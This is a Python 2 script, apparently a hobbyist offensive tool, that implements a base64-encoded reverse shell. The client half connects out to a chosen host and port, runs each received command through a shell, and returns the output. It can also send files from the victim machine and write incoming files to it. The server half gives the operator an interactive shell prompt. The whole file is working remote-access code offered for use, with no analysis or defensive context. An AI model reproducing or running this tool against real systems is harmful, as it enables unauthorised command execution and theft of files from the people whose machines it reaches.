import socket
import subprocess
import os
import base64
import sys
from optparse import OptionParser

parse=OptionParser(


"""


  _        ____   ____   ____   _____   ______
 | |      / __ \ |    \ / __ \ |_____| |  ____|
 | |     | |  | ||  |  |\ \|_| | |__   | |  __
 | |     | |  | ||  __/ _\ \   |  __|  | | |_ |
 | |____ | |__| || |   | || \  |_|___  | |__| |
 |______| \____/ |_|   |____|  |_____|  \____/
                
      https://dealwithrafa.wordpress.com
                 To infinity.


options:

-c ,--client    [::] To act as a client who initiates the connection
-s,--serverpwn  [::] To act as server who waits for connection


[+]usage:

./reverse_shell_base64.py -c 127.0.0.1:3030
./reverse_shell_base64.py -s 3030

    """)


parse.add_option("-c","--client",dest="C",type="string",help="Act as client")
parse.add_option("-s","--server",dest="S",type="string",help="Act as server")

(opt,args)=parse.parse_args()

if opt.S==None and opt.C==None:
    print(parse.usage)
    exit(0)

def client(ip,port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))

    while True:
        comand = base64.b64decode(s.recv(1024))

        if 'download' in comand:

            send_file(s,comand.split(' ')[1])
            continue
        elif 'upload' in comand:
            recv_file(s,comand.split(' ')[1])
            continue
        else:
            Wshel = subprocess.Popen(comand,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output = Wshel.stdout.read() + Wshel.stderr.read()
            s.send(base64.b64encode(output))

def server(port):
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind(('0.0.0.0',port))
    server.listen(5)
    try:
        s, addr = server.accept()
    except:
        print 'error in accepting new connection'
        sys.exit()
    print 'connection received'
    while True:

        comand = raw_input('shell>')
        if 'download' in comand:
            s.send(base64.b64encode(comand))
            path = comand.split(' ')[1]
            recv_file(s,path)
            continue
        elif 'upload' in comand:
            s.send(base64.b64encode(comand))
            path = comand.split(' ')[1]
            send_file(s,path)
            continue
        else:
            s.send(base64.b64encode(comand))
            print base64.b64decode(s.recv(1024))

def send_file(connection, path):
    if os.path.exists(path):
        f = open(path,'rb')
        data = f.read(1024)
        while data !='':
            connection.send(base64.b64encode(data))
            data = f.read(1024)
        connection.send(base64.b64encode('done'))
        f.close()
    else:
        connection.send(base64.b64encode('unable to find file'))
        return
    return

def recv_file(connection,path):
    if path.startswith('/'):
        f = open("./"+path.split('/')[-1],'wb')
    else:
        f = open('./'+path,'wb')

    while True:
        data = base64.b64decode(connection.recv(1024))
        if 'done' in data:
            f.close()
            break
        f.write(data)
    return

if opt.S == None and opt.C != None:
    print 'acting as client'
    host_info = opt.C.split(':')
    client (host_info[0],int(host_info[1]))
elif opt.S != None and opt.C == None:
    print 'acting as server'
    server (int(opt.S))
